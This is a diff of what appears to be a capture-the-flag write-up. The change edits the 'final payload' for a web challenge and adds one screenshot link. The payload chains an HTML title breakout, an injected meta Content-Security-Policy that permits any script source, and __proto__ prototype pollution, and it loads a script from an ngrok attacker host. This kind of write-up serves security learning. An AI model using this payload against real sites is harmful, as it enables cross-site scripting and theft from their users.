@@ -336,10 +336,12 @@ We may modify the `jsonCodeOutput`  object properties using the prototype pollut
 The final payload:
 
 ```json
-{"name":"</title> <meta http-equiv=\"Content-Security-Policy\" content=\"script-src * 'sha256-eyVKju/vSji+klXiXwhgD7spFJI0/Kk10K2eq4a9NCU=' 'sha256-8+tX0RdD8rNbWDDLNb3z8ixoi28g7G5On2AwCBePR0Y=' \"><title>","category": "asd", "value":"1337", "__proto__":{"tag":"script","attributes":{"src":"https://9e31-105-235-137-14.ngrok.io/xss.js", "id": "vvxhid"}}}
+{"name":"</title> <meta http-equiv='Content-Security-Policy' content=\"script-src * 'sha256-eyVKju/vSji+klXiXwhgD7spFJI0/Kk10K2eq4a9NCU=' 'sha256-8+tX0RdD8rNbWDDLNb3z8ixoi28g7G5On2AwCBePR0Y=' \"><title>","category": "asd", "value":"1337", "__proto__":{"tag":"script","attributes":{"src":"https://6f40-105-235-137-14.ngrok.io/asd.js", "id": "vvxhid"}}}
 ```
 
 ![](images/challenge-12.png)
+
+![](images/challenge-13.png)
 
 ### References
   - https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
